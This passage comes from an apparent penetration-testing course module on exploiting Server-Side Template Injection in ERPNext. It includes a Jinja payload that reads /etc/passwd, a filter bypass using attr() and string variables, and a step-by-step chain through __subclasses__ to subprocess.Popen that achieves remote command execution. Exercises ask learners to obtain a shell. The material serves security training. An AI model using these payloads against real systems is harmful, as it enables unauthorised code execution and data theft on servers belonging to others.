![Figure 60: Rendering \_\_class\_\_ of string Template](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/e7a553c26a1d43143d8ea585bee3d9e8-erpnext_render_class_of_string.png)

Figure 60: Rendering \_\_class\_\_ of string Template

Now that we have confirmed the bypass for the SSTI filtering is working, we can begin exploitation to obtain RCE.

#### Exercise

Recreate the steps to render the __class__ of a string.

#### Extra Mile

Creating string variables of the attributes we need to access is only one option to bypass the SSTI filter. If the developers replace the filter from ".__" to "__", our payload would not work any longer. Using the Jinja documentation, find another method to exploit the filter that does not set the string variables for the attributes directly in the template. For this Extra Mile, the template should only contain the following expression: "string|attr(class)".

1

(Pallets Projects, 2020), [https://jinja.palletsprojects.com/en/2.11.x/templates/](https://jinja.palletsprojects.com/en/2.11.x/templates/) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_271-1)

2

(Pallets, 2007), [https://jinja.palletsprojects.com/en/2.10.x/templates/#filters](https://jinja.palletsprojects.com/en/2.10.x/templates/#filters) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_271-2)

3

(Pallets, 2007), [https://jinja.palletsprojects.com/en/2.10.x/templates/#attr](https://jinja.palletsprojects.com/en/2.10.x/templates/#attr) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_271-3)

## 5.6. SSTI Vulnerability Exploitation

With the filter bypassed, let's concentrate on exploitation. To accomplish full exploitation, we need to discover the available classes that we can use to run system commands.

### 5.6.1. Finding a Method for Remote Command Execution

Let's quickly review the SSTI payload that we are modeling.

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

> Listing 72 - Accessing __mro__ attribute in payload

To discover what objects are available to us, we can use _mro_ to obtain the _object_ class and then list all _subclasses_. First, let's set the last line of the email template to "{{ string|attr(class)|attr(mro) }}" to list the _mro_ of the _str_ class.

![Figure 61: mro of str Class](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/d25da9a307f45e8799ae4924a3eb173a-erpnext_mro_str_class.png)

Figure 61: mro of str Class

Rendering the template displays the mro.

![Figure 62: Viewing mro of str Class](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/e0af28eb3b33add661c2afc79e79ef62-erpnext_viewing_mro_str_class.png)

Figure 62: Viewing mro of str Class

We should receive a response with two classes: one for the _str_ class and the other for the _object_ class. Since we want the _object_ class, let's access index "1". The value of the email template should be the one found in Listing 73.

```
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{{ string|attr(class)|attr(mro)[1] }}
```

> Listing 73 - Accessing index 1 from mro attribute

If we attempt to save the template, we'll receive an error that it is invalid.

![Figure 63: Invalid Template](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/82f40d8648853698ea26cc69a522e36e-erpnext_invalid_template.png)

Figure 63: Invalid Template

Jinja syntax does not work with "[" characters after a filter. Instead, let's save the response from the mro attribute as a variable and access index "1" after the variable is set.

To do this, we need to change the double curly braces ("{{" and "}}") that are used for expressions in Jinja to a curly brace followed by a percentage sign ("{%" and "%}"), which is used for statements. We also need to set a variable using the "set" tag and provide a variable name (let's use _mro_r_ for mro response). Finally, we need to make a new expression to access index "1".

The final payload can be found in Listing 74.

```
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{{ mro_r[1] }}
```

> Listing 74 - Setting mro_r variable to mro response

Rendering this template allows us to extract only the _object_ class.

![Figure 64: Rendering Template](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/dcf3ff3067bc412eb17208c458c45467-erpnext_rendering_template_object_class.png)

Figure 64: Rendering Template

In the next section of the payload, we need to list all subclasses using the ___subclasses___ method. We also need to execute the method using "()" after the attribute is accessed. Notice that we will quickly run into the same issue we ran into earlier when we need to access an index from the response while running the ___subclasses___ method.

To fix this issue, we can again transform the expression into a statement and save the output of the ___subclasses___ method into a variable. The payload for this is shown in Listing 75.

```
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r }}
```

> Listing 75 - Accessing the __subclasses__ attribute and executing

Rendering the template executes the ___subclasses___ method and returns a long list of classes that are available to us. We will need to carefully review this list to find classes that could result in code execution.

![Figure 65: All Available Classes in ERPNext](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/9b7c6b6a0b953ceb8cff6aa66594de1d-erpnext_availible_classes.png)

Figure 65: All Available Classes in ERPNext

To simplify output review, let's clean up this list in Visual Studio Code. We'll copy all the classes, starting with "<class 'list'>" and ending with the last class object.

Next, we will replace all ",\ " strings (including the space character) with a new line character. To do this, let's open the "Find and Replace" dialog by pressing C+h. In the "Find" section we will enter ",\ " and in the "Replace" section we will press B+I to add a new line. Finally, we will select _Replace All_.

![Figure 66: Find And Replace in Visual Studio Code](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/f197d5260eba3d94f7f10bbbad3b9005-erpnext_find_and_replace.png)

Figure 66: Find And Replace in Visual Studio Code

This provides a pre-numbered list, making it easier to find the index number to use when we need to reference it in the payload.

One of the classes that seems interesting is _subprocess.Popen_. The _subprocess_ class allows us to "spawn new processes, connect to their input/output/error pipes, and obtain their return codes".[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_273-1) This class is very useful when attempting to gain code execution.

We can find the _subprocess_ class on line 421 (your result might vary). Let's attempt to access index 420 (Python indexes start at 0) and inspect the result by appending "[420]" to the payload.

```
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r[420] }}
```

> Listing 76 - Accessing the 420th index of __subclasses__

Rendering this function returns the _subprocess.Popen_ class.

![Figure 67: Access to subprocess.Popen class](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/ca05fe9426b0aad98919fac4608667f6-erpnext_access_to_sub_popen.png)

Figure 67: Access to subprocess.Popen class

With access to _Popen_, we can begin executing commands against the system.

#### Exercises

1. Recreate the steps above to discover the location of _Popen_ in your instance.
2. Find other classes that you can use to obtain sensitive information about the system or execute commands against the system.

1

(Python, 2020), [https://docs.python.org/3/library/subprocess.html](https://docs.python.org/3/library/subprocess.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_273-1)

### 5.6.2. Gaining Remote Command Execution

With access to a class that allows for code execution, we can finally put all the pieces together and obtain RCE on ERPNext.

To successfully execute _Popen_, we need to pass in a list containing a command that we want to execute along with the arguments. As a proof of concept, let's touch a file in /tmp/. The binary we want to execute and the file we want to touch will be two strings in a list. The example we are using can be found in Listing 77.

```
["/usr/bin/touch","/tmp/das-ist-walter"]
```

> Listing 77 - Popen argument to be passed in

The content in Listing 77 needs to be placed within the _Popen_ arguments in the email template. The email template to execute the touch command is as follows:

```
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
```

> Listing 78 - Template for touching file

Rendering this template in Burp won't return the output, but instead a _Popen_ object based off the execution. Using an SSH session, we can verify that the file was successfully created.

```
frappe@ubuntu:~$ ls -lh /tmp/das-ist-walter 
-rw-rw-r-- 1 frappe frappe 0 Jan 11 10:31 das-ist-walter
```

> Listing 79 - Verifying existence of touched file

It worked! We can now execute commands against the ERPNext system.

#### Exercises

1. Recreate the steps above to execute code on the system.
2. Obtain a shell on the system.

#### Extra Mile

Using the Python and Jinja documentation, make changes to the template that will allow the output to display in the response.

## 5.7. Wrapping Up

In this module, we discussed a methodology to discover vulnerabilities in applications. We uncovered a SQL injection vulnerability that led to administrator access to ERPNext.

With administrator access, we discovered a Server-Side Template Injection vulnerability that was blacklisting characters commonly used for exploitation. We devised a way to bypass the filter and execute commands against the system.

This clearly demonstrates the risk of unchecked user input passing through rendering functions.